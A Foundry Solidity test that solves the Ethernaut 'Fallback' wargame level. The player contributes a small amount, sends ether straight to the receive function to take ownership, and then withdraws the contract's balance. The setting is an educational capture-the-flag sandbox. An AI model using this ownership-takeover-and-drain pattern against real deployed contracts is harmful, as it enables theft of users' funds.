// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {Statistics} from "src/metrics/Statistics.sol";
import {FallbackFactory} from "src/levels/FallbackFactory.sol";

interface IFallback {
    function contribute() external payable;

    function withdraw() external;
}

contract FallbackTest is Test {
    Ethernaut public ethernaut;
    FallbackFactory public fallbackFactory;
    address public immutable PLAYER = makeAddr("PLAYER");

    function setUp() public {
        // ----------------------------------
        // Deploy Ethernaut contract
        // ----------------------------------
        Statistics statistics = new Statistics();
        ethernaut = new Ethernaut();
        statistics.initialize(address(ethernaut));
        ethernaut.setStatistics(address(statistics));

        // ----------------------------------
        // Register level
        // ----------------------------------
        fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
    }

    function test_Fallback() public {
        IFallback target;

        vm.startPrank(PLAYER);
        vm.recordLogs();

        // ----------------------------------
        // Create level instance
        // ----------------------------------
        ethernaut.createLevelInstance(fallbackFactory);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        target = IFallback(
            payable(address(uint160(uint256(entries[0].topics[2]))))
        );

        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.deal(address(target), 1000 ether);
        vm.deal(PLAYER, 1 ether);

        target.contribute{value: 1}();

        // Invoke receive function
        (bool success, ) = payable(address(target)).call{value: 1}("");
        require(success, "tx failed");

        target.withdraw();

        // ----------------------------------
        // Validate
        // ----------------------------------
        ethernaut.submitLevelInstance(payable(address(target)));
        entries = vm.getRecordedLogs();
        assertEq(entries.length, 2);
    }
}
